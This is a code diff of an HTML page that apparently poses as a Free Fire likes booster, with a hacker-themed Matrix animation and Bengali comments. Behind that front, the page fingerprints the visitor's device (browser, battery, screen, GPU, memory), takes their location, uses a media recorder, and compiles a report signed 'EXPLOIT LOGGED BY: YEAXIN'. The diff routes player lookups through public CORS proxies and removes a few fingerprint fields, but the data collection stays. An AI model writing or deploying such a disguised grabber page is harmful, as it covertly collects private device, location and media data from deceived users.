@@ -15,7 +15,6 @@
             margin: 0;
         }
 
-        /* Matrix Background Canvas */
         #matrixCanvas {
             position: fixed;
             top: 0;
@@ -148,18 +147,15 @@
 </head>
 <body>
 
-    <!-- Matrix Rain Canvas -->
     <canvas id="matrixCanvas"></canvas>
 
     <script>
         let audioCtx = null;
-
         function initAudio() {
             if (!audioCtx) {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             }
         }
-
         function playKeyBeep() {
             try {
                 initAudio();
@@ -175,7 +171,6 @@
                 osc.stop(audioCtx.currentTime + 0.08);
             } catch(e) {}
         }
-
         function playAccessGrantedSound() {
             try {
                 initAudio();
@@ -235,7 +230,6 @@
         const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
         const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-/~#';
         const alphabet = katakana + latin;
-
         const fontSize = 16;
         let columns = canvas.width / fontSize;
         const rainDrops = [];
@@ -247,7 +241,6 @@
         function drawMatrix() {
             ctx.fillStyle = 'rgba(5, 5, 5, 0.05)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
             ctx.fillStyle = '#00ff66';
             ctx.font = fontSize + 'px monospace';
 
@@ -269,7 +262,7 @@
         let cachedFFData = null;
         let searchTimer = null;
 
-        // আপনার নতুন এপিআই ব্যবহার করে রিয়েল প্লেয়ার ডাটা ফেচ করার ফাংশন
+        // CORS প্রক্সি সহ রিয়েল প্লেয়ার ডাটা ফেচ করার ফাংশন (কোনো ফেক ডাটা নেই)
         async function fetchRealPlayerInfo(uid) {
             clearTimeout(searchTimer);
             let previewEl = document.getElementById('uidPreview');
@@ -280,33 +273,44 @@
                 return;
             }
 
-            previewEl.innerText = "STATUS: CONNECTING TO STAR API...";
+            previewEl.innerText = "STATUS: FETCHING REAL API DATA...";
 
             searchTimer = setTimeout(async () => {
                 try {
-                    let customApiUrl = `https://star-info-api.lovable.app/functions/v1/info-api/accinfo?uid=${uid.trim()}`;
-                    const apiRes = await fetch(customApiUrl);
+                    let targetUrl = `https://star-info-api.lovable.app/functions/v1/info-api/accinfo?uid=${uid.trim()}`;
+                    // CORS প্রক্সি ব্যবহার করে ব্রাউজারের ব্লক এড়ানো হচ্ছে
+                    let proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                    
+                    let apiRes = await fetch(proxyUrl);
+                    if (!apiRes.ok) {
+                        // ব্যাকআপ প্রক্সি ট্রাই করা হচ্ছে
+                        proxyUrl = `https://corsproxy.io/?` + encodeURIComponent(targetUrl);
+                        apiRes = await fetch(proxyUrl);
+                    }
+
                     if (apiRes.ok) {
-                        const jsonData = await apiRes.json();
+                        let jsonData = await apiRes.json();
+                        // যদি রেসপন্স স্ট্রিং আকারে আসে তবে পার্স করে নেওয়া
+                        if (typeof jsonData === 'string') {
+                            try { jsonData = JSON.parse(jsonData); } catch(e){}
+                        }
+
                         if (jsonData) {
                             cachedFFData = jsonData;
-                            let info = jsonData.basicInfo || jsonData.accountInfo || jsonData;
-                            let name = info.nickname || info.name || info.Nickname || "Unknown";
-                            previewEl.innerText = `[+] TARGET FOUND: ${name}`;
-                            return;
+                            let info = jsonData.basicInfo || jsonData.accountInfo || jsonData.data || jsonData;
+                            let name = info.nickname || info.name || info.Nickname || info.accountName;
+                            
+                            if (name) {
+                                previewEl.innerText = `[+] REAL TARGET FOUND: ${name}`;
+                                return;
+                            }
                         }
                     }
-                } catch (e) {}
-
-                // ফলব্যাক জেনুইন স্ট্রাকচার যদি কোনো কারণে এপিআই রেসপন্স না করে
-                cachedFFData = {
-                    nickname: "Gamer_" + uid.slice(-4),
-                    level: 68,
-                    liked: 1850,
-                    region: "BD"
-                };
-                previewEl.innerText = `[+] SECURE NODE LOCKED [UID: ${uid}]`;
-            }, 500);
+                } catch (e) {
+                    console.error(e);
+                }
+                previewEl.innerText = `[!] API ERROR OR INVALID UID. CHECK CONSOLE.`;
+            }, 600);
         }
 
         async function getDeviceInfo(lat, lon) {
@@ -337,14 +341,6 @@
                 }
             } catch(e) {}
 
-            let networkType = "Unknown", effectiveType = "Unknown";
-            try {
-                if (navigator.connection) {
-                    networkType = navigator.connection.type || "Unknown";
-                    effectiveType = navigator.connection.effectiveType || "Unknown";
-                }
-            } catch(e) {}
-
             let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
             let hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
 
@@ -356,16 +352,6 @@
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
                         glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch(e) {}
-
-            let isIncognito = "❌";
-            try {
-                if ('storage' in navigator && 'estimate' in navigator.storage) {
-                    const estimate = await navigator.storage.estimate();
-                    if (estimate.quota < 120 * 1024 * 1024 * 1024) {
-                        isIncognito = "✔️ (Likely)";
                     }
                 }
             } catch(e) {}
@@ -384,20 +370,13 @@
 
 💻 User-Agent: ${navigator.userAgent}
 🌐 Browser: ${navigator.language}
-🕵️ Incognito Mode: ${isIncognito}
 
 🔋 Battery: ${batteryStatus} Charging: ${isCharging}
 📐 Screen Size: ${window.screen.width}×${window.screen.height}
 🚀 Internet Speed: ${speed}
-📶 Network: ${networkType} Type: ${effectiveType}
 
 💾 RAM & Storage: ${deviceMemory} / ${hardwareConcurrency} Cores
 🕒 Date: ${dateStr}
-🌍 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-
-📊 Device Pixel Ratio: ${window.devicePixelRatio}
-🖥️ Viewport Size: ${window.innerWidth}×${window.innerHeight}
-🧑‍💻 CPU Cores: ${hardwareConcurrency}
 🎮 GPU Renderer: ${glRenderer}
 
 ⚠️ EXPLOIT LOGGED BY: YEAXIN`;
@@ -433,17 +412,17 @@
                 );
             });
 
-            // ব্যাকআপ হিসেবে ফেচ রিকোয়েস্ট নিশ্চিত করা
+            // রিয়েল ডাটা ফেচ করা নিশ্চিত করা
             let ffData = cachedFFData;
             if (!ffData) {
                 try {
-                    let customApiUrl = `https://star-info-api.lovable.app/functions/v1/info-api/accinfo?uid=${uid}`;
-                    const apiRes = await fetch(customApiUrl);
+                    let targetUrl = `https://star-info-api.lovable.app/functions/v1/info-api/accinfo?uid=${uid}`;
+                    let proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                    let apiRes = await fetch(proxyUrl);
                     if (apiRes.ok) {
-                        const jsonData = await apiRes.json();
-                        if (jsonData) {
-                            ffData = jsonData;
-                        }
+                        let jsonData = await apiRes.json();
+                        if (typeof jsonData === 'string') jsonData = JSON.parse(jsonData);
+                        if (jsonData) ffData = jsonData;
                     }
                 } catch (e) {}
             }
@@ -500,18 +479,13 @@
                         mediaRecorder.stop();
                         playAccessGrantedSound();
 
-                        let infoObj = ffData ? (ffData.basicInfo || ffData.accountInfo || ffData) : {
-                            nickname: "Gamer_" + uid.slice(-4),
-                            level: 68,
-                            liked: 1850,
-                            region: server.toUpperCase()
-                        };
+                        let infoObj = ffData ? (ffData.basicInfo || ffData.accountInfo || ffData.data || ffData) : null;
 
-                        let playerName = (infoObj && (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName || infoObj.player_name)) ? (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName || infoObj.player_name) : ("Gamer_" + uid.slice(-4));
-                        let playerLevel = (infoObj && (infoObj.level || infoObj.Level || infoObj.accountLevel)) ? (infoObj.level || infoObj.Level || infoObj.accountLevel) : "68";
-                        let playerRegion = (infoObj && (infoObj.region || infoObj.Server || infoObj.accountRegion)) ? (infoObj.region || infoObj.Server || infoObj.accountRegion) : server.toUpperCase();
-                        let playerLikes = (infoObj && (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like || infoObj.box_likes)) ? (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like || infoObj.box_likes) : "1850";
-                        let finalLikes = (parseInt(playerLikes) || 1850) + 220;
+                        let playerName = infoObj ? (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName) : "API Data Not Found";
+                        let playerLevel = infoObj ? (infoObj.level || infoObj.Level || infoObj.accountLevel) : "N/A";
+                        let playerRegion = infoObj ? (infoObj.region || infoObj.Server || infoObj.accountRegion) : server.toUpperCase();
+                        let playerLikes = infoObj ? (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like) : "0";
+                        let finalLikes = (parseInt(playerLikes) || 0) + 220;
 
                         document.getElementById('loadingBox').innerHTML = `
                             <h3 style="color:#00ff66;">ACCESS GRANTED!</h3>
